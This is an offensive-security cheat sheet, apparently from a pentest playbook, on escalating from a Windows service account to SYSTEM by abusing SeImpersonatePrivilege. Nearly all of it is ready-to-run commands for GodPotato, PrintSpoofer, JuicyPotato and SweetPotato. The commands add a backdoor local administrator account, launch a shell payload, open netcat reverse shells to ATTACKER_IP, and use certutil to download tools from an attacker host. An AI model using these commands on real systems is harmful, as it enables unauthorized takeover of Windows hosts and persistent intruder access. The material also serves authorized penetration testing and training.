---
id: token-impersonation
title: Token Impersonation (SeImpersonate)
stage: privesc
tags: [windows]
tools:
  - whoami /priv
  - GodPotato-NET4.exe -cmd "cmd /c whoami"
  - PrintSpoofer64.exe -i -c cmd
leads_to:
  - system-shell
  - windows-stored-creds
  - dcsync
---

## Check

```cmd
whoami /priv
```

Look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` in the output. These are present on virtually every SQL Server service account and IIS app pool account.

## Exploit

```powershell
# GodPotato — works Windows Server 2012-2022 (widest compat — try first)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"

# PrintSpoofer — Windows 10/Server 2019+
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "nc.exe ATTACKER_IP PORT -e cmd"

# JuicyPotato — Windows < Server 2019
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# SweetPotato — alternative potato
.\SweetPotato.exe -e EfsRpc -p .\nc.exe -a "ATTACKER_IP PORT -e cmd"
```

## Transfer Tools

```powershell
# From WinRM / evil-winrm
upload /path/to/GodPotato-NET4.exe C:\Windows\Temp\gp.exe

# From web shell / cmd
certutil -urlcache -f http://ATTACKER_IP:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
```

## Notes

SeImpersonate is present on nearly every service account. This is usually the fastest path from a service shell to SYSTEM. If on MSSQL via xp_cmdshell, check `EXEC xp_cmdshell 'whoami /priv'` — the SQL service account almost always has this privilege.
